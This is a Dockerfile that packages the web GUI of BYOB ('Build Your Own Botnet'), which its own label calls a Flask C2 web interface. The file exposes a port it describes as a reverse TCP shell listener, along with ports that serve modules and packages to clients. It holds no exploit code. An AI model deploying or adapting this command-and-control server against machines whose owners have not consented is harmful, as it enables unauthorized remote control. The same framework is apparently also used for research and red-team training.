# =============================================================================
# BYOB Web GUI — Production Dockerfile
# =============================================================================
# Build context: web-gui/
# Usage:
#   docker build -t byob-web-gui .
#   docker run -p 5000:5000 -p 1337:1337 byob-web-gui
# =============================================================================

# ── Stage 1: dependency builder ───────────────────────────────────────────────
FROM python:3.9-slim AS builder

WORKDIR /install

# Install build-time system dependencies required to compile native packages
# (pycryptodomex, opencv-python, etc.)
RUN apt-get update && apt-get install -y --no-install-recommends \
        build-essential \
        gcc \
        libssl-dev \
        libffi-dev \
        libglib2.0-0 \
        libsm6 \
        libxrender1 \
        libxext6 \
    && rm -rf /var/lib/apt/lists/*

COPY requirements.txt .

# Install all Python packages into an isolated prefix so they can be copied cleanly.
# pip respects environment markers (sys.platform, python_version) automatically, so
# Windows-only packages (pypiwin32, pyHook, WMI) are silently skipped on Linux.
RUN pip install --upgrade pip \
    && pip install --prefix=/install/deps --no-warn-script-location \
        -r requirements.txt

# ── Stage 2: runtime image ────────────────────────────────────────────────────
FROM python:3.9-slim AS runtime

LABEL org.opencontainers.image.title="BYOB Web GUI" \
      org.opencontainers.image.description="Build Your Own Botnet — Flask C2 web interface" \
      org.opencontainers.image.source="https://github.com/malwaredllc/byob"

# Runtime system libraries needed by opencv-python and other native packages
RUN apt-get update && apt-get install -y --no-install-recommends \
        libglib2.0-0 \
        libsm6 \
        libxrender1 \
        libxext6 \
        libgl1-mesa-glx \
    && rm -rf /var/lib/apt/lists/*

# Copy installed Python packages from the builder stage
COPY --from=builder /install/deps /usr/local

WORKDIR /app

# Copy the application source
COPY . .

# Create a directory for the SQLite database so it can be volume-mounted
RUN mkdir -p /data

# Create a non-root user for security and assign ownership
RUN groupadd -r byob && useradd -r -g byob byob \
    && chown -R byob:byob /app /data

USER byob

# ── Ports ──────────────────────────────────────────────────────────────────────
# 5000  — Flask web GUI (HTTP)
# 1337  — C2 reverse TCP shell listener
# 1338  — BYOB modules HTTP server  (served by C2 automatically)
# 1339  — BYOB packages HTTP server (served by C2 automatically)
EXPOSE 5000 1337 1338 1339

# Persist the SQLite database outside the container
VOLUME ["/data"]

# Environment variable defaults (override at runtime)
ENV BYOB_APP_SECRET_KEY="" \
    SQLALCHEMY_DATABASE_URI="sqlite:////data/database.db" \
    PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1

# Health-check: verify the Flask app is responding
HEALTHCHECK --interval=30s --timeout=10s --start-period=15s --retries=3 \
    CMD python -c "import urllib.request; urllib.request.urlopen('http://localhost:5000')" || exit 1

ENTRYPOINT ["python", "run.py"]
